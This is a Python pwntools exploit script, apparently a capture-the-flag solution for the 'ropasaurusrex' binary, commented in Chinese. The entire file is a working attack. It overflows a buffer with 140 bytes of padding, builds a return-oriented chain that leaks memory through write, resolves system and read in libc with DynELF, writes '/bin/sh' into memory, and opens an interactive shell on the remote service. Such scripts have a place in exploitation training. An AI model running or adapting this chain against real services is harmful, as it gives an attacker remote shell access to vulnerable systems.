#!/usr/bin/python
#coding:utf-8

from pwn import *

io = remote('172.17.0.2', 10001)
elf = ELF('./ropasaurusrex')

start_addr = 0x08048340
write_addr = elf.symbols['write']
binsh_addr = 0x08049000

def leak(addr):
	payload = ''
	payload += 'A'*140			#padding
	payload += p32(write_addr)	#调用write
	payload += p32(start_addr)	#write返回到start
	payload += p32(1)			#write第一个参数fd
	payload += p32(addr)		#write第二个参数buf
	payload += p32(8)			#write第三个参数size
	io.sendline(payload)
	content = io.recv()[:8]
	print("%#x -> %s" %(addr, (content or '').encode('hex')))
	return content

d = DynELF(leak, elf = elf)
system_addr = d.lookup('system', 'libc')
read_addr = d.lookup('read', 'libc')

log.info("system_addr = %#x", system_addr)
log.info("read_addr = %#x", read_addr)

payload = ''
payload += 'A'*140				#padding
payload += p32(read_addr)		#调用read
payload += p32(system_addr)		#read返回到system
payload += p32(0)				#read第一个参数fd/system返回地址，无意义
payload += p32(binsh_addr)		#read第二个参数buf/system第一个参数
payload += p32(8)				#read第三个参数size

io.sendline(payload)
io.sendline('/bin/sh\x00')
io.interactive()
